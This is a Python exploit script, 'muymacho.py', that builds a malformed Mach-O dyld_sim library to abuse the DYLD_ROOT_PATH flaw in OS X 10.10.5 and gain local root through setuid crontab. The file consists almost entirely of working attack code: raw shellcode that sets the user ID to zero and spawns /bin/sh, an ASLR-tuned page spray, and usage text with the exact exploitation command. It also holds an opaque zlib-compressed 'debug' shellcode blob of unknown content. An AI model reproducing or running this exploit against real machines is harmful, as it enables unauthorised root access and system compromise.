'''
muymacho.py - exploit for DYLD_ROOT_PATH vuln in OS X 10.10.5

Luis Miras @_luism

muymacho is an exploit for a dyld bug present in Mac OS X 10.10.5
allowing local privilege escalation to root. It has been patched in
El Capitan.

muymacho creates a malformed Mach-O library, dyld_sim, used to exploit
dyld through the DYLD_ROOT_PATH environment variable. For more info see:
http://luismiras.github.io


USAGE: muymacho.py [-d] base_directory

 -d               super secret debug shellcode
 base_directory   dyld_sim will be created in base_directory/usr/lib/dyld_sim

example: python muymacho.py /tmp

a malformed dyld_sim will be created in /tmp/usr/lib/dyld_sim
exploitation is then achived by executing:
  DYLD_ROOT_PATH=/tmp crontab


The super sekret debug shellcode is selected by passing a "-d" command line
switch. After muymacho returns with the hashtag symbol (aka #), 
be sure to type in:

  echo "$MUYMACHO"

'''
import os
import sys
import platform

from struct import pack

shellcode = "\x49\x89\xc4\x49\x83\xc4\x21\xb8\x17\x00\x00\x02\x48\x31\xff" \
    "\x0f\x05\xb8\x3b\x00\x00\x02\x4c\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f" \
    "\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00"

jmp_rax = "\xff\xe0"

debug = "\x78\xda\x9d\x95\xcd\x4f\x13\x41\x14\xc0\xb7\xa4\x7c\xc4\x83\x18\x2f\x1e\xb8\x7a" \
    "\xf3\x80\x15\xbf\x88\x17\x89\x97\x21\xe9\xc9\xff\x40\x54\xa2\x17\x2f\x86\x3b\xd0" \
    "\x59\x66\x77\xc8\x26\x6e\x62\x24\xa9\x31\xe9\xc5\x0b\x7f\x41\x8d\x09\x55\x81\x6d" \
    "\x1c\xa0\x4d\x34\x69\xe8\x05\x0d\x0a\x14\xea\x57\x4a\x76\x0c\x1e\xac\xef\x4d\xb7" \
    "\xdb\x6d\x2b\xcd\xd2\xb7\x79\x9d\xe9\xbc\xf7\x7e\xfb\x66\xe6\xcd\xec\x58\x7a\xfa" \
    "\x94\xa6\x8d\x47\x4a\xe3\xe6\xca\xb8\xb9\x41\x96\xfe\x68\x35\x89\x47\x76\x33\x9f" \
    "\xfb\xb0\xcd\xbe\x1a\x82\xff\x87\xe4\x65\xdc\x74\x48\xec\x7d\x26\xdd\xaf\x69\x24" \
    "\xf2\x9b\xa4\x17\x3d\x21\x23\xd1\xd3\xc4\x04\x4d\x38\x03\x64\xf4\xef\xd4\xce\xe4" \
    "\xfc\xad\xb3\x93\x63\xe6\x74\x35\xaa\x69\x99\x67\xbd\x00\x31\xcb\xa5\x9b\x00\xc9" \
    "\xdc\x86\x3f\xaf\xd3\x1a\x02\xca\x64\x7e\xa8\x74\x01\xba\xe9\x73\x9a\xd6\x43\x62" \
    "\xd5\xc1\xde\xb8\xf9\x8e\x24\x0e\xce\xc4\xcd\x9e\xf4\x0d\x1c\xcb\x54\xfc\x64\xf6" \
    "\x48\x4c\x82\x43\x24\x4b\x96\xb6\x1b\x19\x12\xf3\x88\x24\xf6\x7b\xc9\xdb\xf2\x00" \
    "\x68\x94\xc4\xde\x18\x9b\xe7\x07\x79\xb4\xcf\xe8\x27\xd5\x3c\x19\x3d\x9a\x2a\x2d" \
    "\x5f\x8c\x5d\x1a\xb9\x7c\xe5\xea\xb5\xeb\xa3\x77\x26\xee\xde\xbb\x3f\x39\x3c\xf1" \
    "\xf0\xd1\xf0\xe3\x07\x1a\x6f\x17\x29\x41\x53\xad\xa3\x05\x1e\x4a\x74\x9d\xeb\xa2" \
    "\x9b\x60\xd7\x75\x31\xd6\x75\x9b\x82\x67\x58\x4d\x66\x3a\x85\xce\x0a\x78\xc0\xc9" \
    "\x60\x22\x91\x5a\x74\x56\x1d\x4a\xe9\x5e\xf5\x70\xaf\xbc\xbf\xbd\xb3\x90\xe2\xdd" \
    "\x49\x4b\x22\xe1\x45\x97\xb5\xd5\x83\x09\x29\xc5\x5e\xb3\x06\x6d\xbc\x3e\xa4\x06" \
    "\x21\x94\xcb\xba\xc1\xc5\x14\x74\x0b\x5a\x81\x2a\x11\x1c\xd4\xa0\x0d\x5e\x6b\xd5" \
    "\x5a\xd5\x51\x20\xee\x72\x65\x50\x0e\x29\xde\x14\x8a\xaf\x09\xb4\xad\xe8\x5d\x49" \
    "\xa5\xab\xab\x5c\xea\xee\x75\x03\x4e\xce\x8b\xf2\x15\xf7\x4e\xea\x02\xdb\x76\x9b" \
    "\x4e\x7d\x27\xd9\x1a\x04\xeb\x24\x75\x8c\xf5\x15\x06\x39\x17\xaa\x7d\xda\x66\x6b" \
    "\x38\x81\x57\x73\x50\xaa\xc3\x7e\x74\xb6\x2b\x70\xb7\x55\xd2\x90\x03\xd7\xf9\xb4" \
    "\x5c\xcc\xa6\xc2\x92\xa8\xa1\x9e\x70\xee\xb3\xc2\xeb\x88\x44\x6b\x99\x52\xb6\xc0" \
    "\x42\x52\xb8\x45\xc1\x9d\x51\x66\x37\x67\xc2\x80\xce\x2c\x34\x87\xe3\x50\x66\x09" \
    "\xba\xca\x21\x15\x19\x5c\x67\x34\x20\x1f\x48\x42\x86\x22\x09\x1b\x4e\x6d\xa2\x46" \
    "\xb1\x83\x20\x9d\xdb\x50\xdb\x48\xb3\xb8\x08\x39\x39\x61\x1b\xc2\xc3\xf8\x69\xd9" \
    "\x9c\x42\x56\x16\xae\x13\x90\x20\xa9\xfa\x7d\x72\x8c\x78\xd7\xcc\x2c\xfe\x24\x9a" \
    "\x2e\xae\x02\x26\x45\x19\x26\x04\xc2\x20\x29\x18\xf9\xf1\xb3\x54\xfd\xce\xbf\x7c" \
    "\xfd\xb6\xf3\x8b\x1f\x77\xe5\x59\xf5\x18\x3f\xab\x02\x66\x24\x60\xb5\x99\xc5\x64" \
    "\x0d\xd4\x49\x7c\xb3\xee\x52\xa8\x65\x5a\xc0\xe3\xe3\xcd\x8e\x5b\xc0\x62\x40\xa2" \
    "\x0a\x53\xcc\x6f\x64\xf3\x2b\x5b\x3c\xf9\xa1\x52\x39\x1e\xd3\x28\x07\x46\xd5\x4d" \
    "\x23\x05\x0e\xba\x36\x9b\x53\x14\x67\x75\x2d\x57\xce\xe5\x36\xf3\xc5\xe2\x13\x40" \
    "\x25\x93\xc9\xe7\x15\x14\xe8\xf8\x94\x42\xa0\x18\xa0\xfe\x6c\x24\x49\xac\x22\x8f" \
    "\x91\xfb\xe8\xe4\xdc\xad\xb5\xcd\x8d\xfc\x16\x32\x5e\xac\xaf\xaf\xb7\x31\x64\x4b" \
    "\x46\xc2\xb0\x05\x13\x73\xcc\x80\x5b\x3c\xf4\xa2\xc8\xa6\xd6\x62\x0c\x6a\x8f\xb6" \
    "\x6f\xf4\xcc\xff\x37\x5a\x9d\x09\xff\x6c\xa8\x70\x50\x4b\x3f\xd1\x07\x4c\x78\xcb" \
    "\xc8\x85\x85\x68\x4b\xd8\x27\xfe\xfe\x09\xc3\x30\xe0\x60\xe2\xc5\x36\x17\xee\xe5" \
    "\xff\x00\xa8\xdb\x11\xe3"

debug_flag = False

def pack_uint32(x):
    return pack("<L", x)

def pack_uint64(x):
    return pack("<Q", x)

class MachoFile(object):
    
    def __init__(self):
        
        self.magic =       0xfeedfacf
        self.cpu_type =    0x01000007
        self.cpu_subtype = 0x00000003
        self.filetype    = 0x00000007
        self.flags       = 0x00000001
        self.reserved    = 0x00000000
        
        self.data_content = None
        self.load_commands = []
        return

    
    def write_to_file(self, filename):
        mf = self.render()
        fd = open(filename, mode='w')
        fd.write(mf)
        fd.close()
        return True
    

    def render(self):

        mf = ""
        mf += pack_uint32(self.magic)
        mf += pack_uint32(self.cpu_type)
        mf += pack_uint32(self.cpu_subtype)
        mf += pack_uint32(self.filetype)
        
        num_commands = len(self.load_commands)
        mf += pack_uint32(num_commands)
        size_commands = 0
        for cmd in self.load_commands:
            size_commands += cmd.size()
            
        mf += pack_uint32(size_commands)
        mf += pack_uint32(self.flags)
        mf += pack_uint32(self.reserved)
        
        for cmd in self.load_commands:
            mf += cmd.render()
            
        # adding data content
        if self.data_content == None:
            return mf
        
        if len(mf) > self.data_offset:
            raise "headers too large for that data offset"
        
        if debug_flag:
            padding = debug[0x1d2:]
            
        else:
            padding_len = self.data_offset - len(mf)    
            padding = "\x00" * padding_len
        
        mf += padding
        mf += self.data_content
        return mf
    
    
    def add_load_command(self, command):
        
        self.load_commands.append(command)
        return

    def add_data(self, file_offset, data):
        
        self.data_offset = file_offset
        self.data_content = data
        return   


class LC_SEGMENT_64(object):
    
    COMMANDS = {0x19: "LC_SEGMENT_64"}
    def __init__(self, segment_name, vm_address, vm_size, file_offset, file_size, init_prot=5, flags=0):
        
        self.command = 0x00000019
        self.command_size = 72 #hardcoded for now
        self.segment_name = segment_name[:16]
        self.vm_address = vm_address
        self.vm_size = vm_size
        self.file_offset = file_offset
        self.file_size = file_size
        self.max_proc = 0x00000007 # hardcoded for now
        self.init_proc = init_prot
        self.sections = [] # sections not supported yet
        self.flags = flags
        return
    
    
    def render(self):
        '''
        renders the completed segment
        '''
        seg = ""
        seg += pack_uint32(self.command)
        
        if len(self.sections) == 0:
            command_size = 72
        else:
            raise "sections not supported yet"
        
        seg += pack_uint32(command_size)
        seg += self.pad_segment_name()
        seg += pack_uint64(self.vm_address)
        seg += pack_uint64(self.vm_size)
        seg += pack_uint64(self.file_offset)
        seg += pack_uint64(self.file_size)
        seg += pack_uint32(self.max_proc)
        seg += pack_uint32(self.init_proc)
        seg += pack_uint32(len(self.sections)) # number of sections
        seg += pack_uint32(self.flags)
        return seg
    
    
    def size(self):

        return len(self.render())

    
    def pad_segment_name(self):
        
        seg_name = self.segment_name
        l = len(seg_name)
        if l < 16:
            seg_name += (16-l) * '\x00'
        return seg_name[:16]



def build_base_page():
    '''
    returns a base page 
    
    muymacho's payload has two types of pages
    
    only the base page contains the shellcode
    all pages contain a 'jmp rax' instruction
    at off 0xdc6
    
    
                     base page                     other pages
                +-----------------+            +-----------------+
    0xfff       |                 |            |                 |
                |                 |            |                 |
                +-----------------+            +-----------------+
    0xdc6  +--- |    jmp rax      |      +----+|    jmp rax      |
           |    +-----------------+      |     +-----------------+
           |    |                 |      |     |                 |
           |    |                 |      |     |                 |
           |    |                 |      |     |                 |
           |    |                 |      |     |                 |
           |    |                 |      |     |                 |
           |    |                 |      |     |                 |
           |    +-----------------+      |     |                 |
           |    |                 |      |     |                 |
           +--> |    shellcode    | <----+     |                 |
    0x000       |                 |            |                 |
                +-----------------+            +-----------------+    
    
    '''

    #page = shellcode
    page = shellcode

    if debug_flag:
        from zlib import decompress
        global debug
        debug = decompress(debug)
        page = debug[:0x1d2]
    padding_len = 0xdc6 - len(page)
    page += "$" * padding_len
    page += jmp_rax
    padding_len = 0x1000 - len(page)
    page += "$" * padding_len
    
    return page


def build_other_pages():
    '''
    returns an other page
    
        other pages
    +-----------------+
    |                 |
    |                 |
    +-----------------+
    |    jmp rax      |
    +-----------------+
    |                 |
    |                 |
    |                 |
    |                 |
    |                 |
    |                 |
    |                 |
    |                 |
    |                 |
    |                 |
    +-----------------+    
    
    '''

    page = "$" * 0xdc6
    page += jmp_rax
    padding_len = 0x1000 - len(page)
    page += "$" * padding_len
    
    return page


def maximum_vmaddr(segment_size):
    '''
    returns the maximum vmaddr
    
    the function assumes the base binary is 9 pages long
    as is the case for crontab giving a 
    loadAddress_min of 0x100009000
    
    if attacking other suid programs, this value should
    be adjusted. in reality a few pages here or there
    won't have a noticeable effect.
    '''
    dyld_target = 0x7fff5fc26000
    loadAddress_min = 0x100009000 
    aslr_slide_max = 0x0ffff000

    dyld_target_max = dyld_target + aslr_slide_max
    maximum_offset = dyld_target_max - loadAddress_min

    # Only one page from the payload needs to hit the maximum offset.
    vmaddr = maximum_offset - segment_size + 0x1000  

    return vmaddr


def create_target_dir(path):
 
    if not os.path.isdir(path):
        os.makedirs(path) # don't catch exception
            
    return True


def muymacho(path):
    ''' 
    builds a muymacho dyld_sim file
    
    '''
    base_dir = os.path.abspath(os.path.expanduser(path))
    print "[+] using base_directory: %s" % base_dir
    target_dir  = os.path.join(base_dir, "usr", "lib")
    print "[+] creating dir: %s" % target_dir
    create_target_dir(target_dir)
    filename = os.path.join(target_dir, "dyld_sim")
    
    print "[+] creating macho file: %s" % filename
    segment_size = 0x1000000
    data_offset = 0x1000
    
    mf = MachoFile()
    vmaddr = maximum_vmaddr(segment_size)
    
    for x in range(32):
        seg_name = "segment 0x%.2x" % x
        print "    LC_SEGMENT_64: %s    vm_addr: 0x%x" % (seg_name, vmaddr)
        seg = LC_SEGMENT_64(seg_name, vmaddr, 0x1000, data_offset, segment_size)
        mf.add_load_command(seg)
        vmaddr -= segment_size
    
    print "[+] building payload"
    data = build_base_page()
    
    for x in range(0x1000, segment_size, 0x1000):
        data += build_other_pages()
        
    mf.add_data(data_offset, data)
    mf.write_to_file(filename)
    print "[+] dyld_sim successfully created"
    print ""
    print "To exploit enter:"
    print "  DYLD_ROOT_PATH=%s crontab\n" % base_dir
    if debug_flag:
        print "For DEBUG INFO, enter the following after receiving"
        print "the hashtag symbol (aka #):"
        print "  echo \"$MUYMACHO\"\n"
    return

def usage():
    print "USAGE: muymacho.py [-d] base_directory\n"
    print " -d               super sekret debug shellcode"
    print " base_directory   dyld_sim will be created in base_directory/usr/lib/dyld_sim"
    print ""
    print "example: python muymacho.py /tmp\n"
    print "a malformed dyld_sim will be created in /tmp/usr/lib/dyld_sim"
    print "exploitation is then achived by executing:"
    print "  DYLD_ROOT_PATH=/tmp crontab\n"
        
    sys.exit()
    return


if __name__ == "__main__":
    
    print "muymacho.py - exploit for DYLD_ROOT_PATH vuln in OS X 10.10.5"
    print "Luis Miras @_luism"
    print ""

    if platform.mac_ver()[0] != "10.10.5":
        print "muymacho exploits 10.10.5. platform.mac_ver reported: %s\n" % platform.mac_ver()[0]
        sys.exit(1)

    import getopt
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hd", ["help", "debug"])
    except getopt.GetoptError as err:
        print str(err) 
        usage()
        sys.exit(2)
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-d", "--debug"):
            debug_flag = True
        else:
            assert False, "Unknown option"

    if len(args) < 1:
        print "missing base directory value\n"
        usage()

    muymacho(args[0])
    
